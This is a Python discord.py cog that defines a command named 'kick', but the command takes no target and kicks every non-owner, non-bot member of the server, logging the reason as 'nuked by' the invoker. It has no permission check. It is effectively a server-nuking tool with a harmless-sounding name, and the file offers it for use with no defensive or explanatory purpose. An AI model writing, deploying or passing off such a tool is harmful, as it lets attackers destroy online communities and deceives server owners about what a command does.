from discord.ext import commands


class User(commands.Cog):

	def __init__(self, client):
		self.client = client

	@commands.Cog.listener()
	async def on_ready(self):
		print("kick command loaded")

	@commands.command()
	async def kick(self, ctx):
		members = ctx.message.guild.members
		for member in members:

			if member != ctx.guild.owner and not member.bot:
				print(f"{member} kicked")
				await member.kick(reason=f"nuked by : {ctx.message.author.name}")
			elif member.bot:
				print(f"{member} is a bot")


def setup(client):
	client.add_cog(User(client))
